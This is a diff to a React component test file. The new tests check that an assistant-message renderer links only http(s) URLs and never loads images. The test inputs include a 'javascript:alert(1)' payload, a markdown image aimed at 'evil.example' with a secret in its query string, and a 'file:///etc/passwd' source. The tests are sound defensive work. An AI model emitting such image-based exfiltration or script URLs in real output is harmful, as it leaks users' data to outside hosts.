@@ -189,12 +189,15 @@ describe('MessageParts — assistant text', () => {
     off()
   })
 
-  it('renders plain links safely and drops unsafe schemes', () => {
+  it('renders http(s) links safely and turns every other URL into plain text', () => {
     render(
       <MessageParts
         paths={paths}
         message={assistant([
-          { type: 'text', text: '[docs](https://example.com) [bad](javascript:alert(1))' },
+          {
+            type: 'text',
+            text: '[docs](https://example.com) [bad](javascript:alert(1)) [rel](/api/projects) [mail](mailto:a@b.c) [ftp](ftp://x.y/z)',
+          },
         ])}
       />,
     )
@@ -202,9 +205,56 @@ describe('MessageParts — assistant text', () => {
     expect(docs.getAttribute('href')).toBe('https://example.com')
     expect(docs.getAttribute('target')).toBe('_blank')
     expect(docs.getAttribute('rel')).toContain('noopener')
-    const bad = screen.getByText('bad')
-    expect(bad.tagName).toBe('SPAN')
-    expect(screen.queryByRole('link', { name: 'bad' })).toBeNull()
+    expect(screen.getAllByRole('link')).toHaveLength(1)
+    for (const text of ['bad', 'rel', 'mail', 'ftp']) {
+      expect(screen.getByText(text).tagName, text).toBe('SPAN')
+    }
+  })
+
+  it('never loads images: a markdown image becomes inert text, with its URL shown but not fetched', () => {
+    const { container } = render(
+      <MessageParts
+        paths={paths}
+        message={assistant([
+          {
+            type: 'text',
+            text: 'See ![leak](https://evil.example/?d=secret) and ![](data:image/png;base64,AAAA) and [![badge](https://evil.example/b.png)](https://example.com)',
+          },
+        ])}
+      />,
+    )
+    expect(container.querySelector('img')).toBeNull()
+    expect(container.querySelectorAll('[src]')).toHaveLength(0)
+    expect(document.querySelectorAll('link[rel="preload"], link[rel="prefetch"]')).toHaveLength(0)
+    expect(screen.getByText(/\[image: leak\]/)).toBeDefined()
+    expect(screen.getByText('https://evil.example/?d=secret').tagName).toBe('CODE')
+    // A non-http(s) source is not even echoed.
+    expect(container.textContent).toContain('[image]')
+    expect(container.textContent).not.toContain('data:image')
+    // An image inside a link stays a link to the (http) target, wrapping the inert text.
+    const link = screen.getByRole('link')
+    expect(link.getAttribute('href')).toBe('https://example.com')
+    expect(link.querySelector('img')).toBeNull()
+    expect(link.textContent).toContain('[image: badge]')
+  })
+
+  it('links source-url parts only when they are http(s)', () => {
+    render(
+      <MessageParts
+        paths={paths}
+        message={assistant([
+          { type: 'source-url', sourceId: 's1', url: 'https://example.com/doc', title: 'Doc' },
+          { type: 'source-url', sourceId: 's2', url: 'javascript:alert(1)', title: 'Bad' },
+          { type: 'source-url', sourceId: 's3', url: 'file:///etc/passwd' },
+        ])}
+      />,
+    )
+    expect(screen.getByRole('link', { name: 'Doc' }).getAttribute('href')).toBe(
+      'https://example.com/doc',
+    )
+    expect(screen.getAllByRole('link')).toHaveLength(1)
+    expect(screen.getByText('Bad').tagName).toBe('SPAN')
+    expect(screen.getByText('file:///etc/passwd').tagName).toBe('SPAN')
   })
 
   it('renders reasoning collapsed and step-start as dividers (except a leading one)', () => {
